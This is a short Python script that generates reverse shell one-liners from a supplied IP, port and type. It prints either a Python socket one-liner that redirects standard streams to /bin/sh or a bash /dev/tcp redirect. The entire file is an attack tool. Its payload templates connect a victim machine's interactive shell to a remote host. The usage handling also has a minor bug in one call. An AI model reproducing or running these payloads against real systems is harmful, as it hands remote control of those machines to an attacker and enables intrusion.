#!/usr/bin/python3

""" This program will generate a reverse shell one liner for you
    given an IP and a port. I decided to stop looking it 
    up every time I needed it and instead added it to this repo """

import sys

python_shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
bash_shell = "bash -i >& /dev/tcp/%s/%s 0>&1"

def main(ip, port, type):
    if type == "1":
        print(python_shell % (ip, port))
    elif type == "2":
        print(bash_shell % (ip, port))
    else:
        usage()

def usage(args):
    if len(args) < 4:
        print('Usage: ./r_shell_generator.py *IP* *PORT* *TYPE*')
        print("Types:")
        print("1: Python")
        print("2: Bash")
        exit()

if __name__ == '__main__':
    usage(sys.argv)
    main(sys.argv[1], sys.argv[2], sys.argv[3])
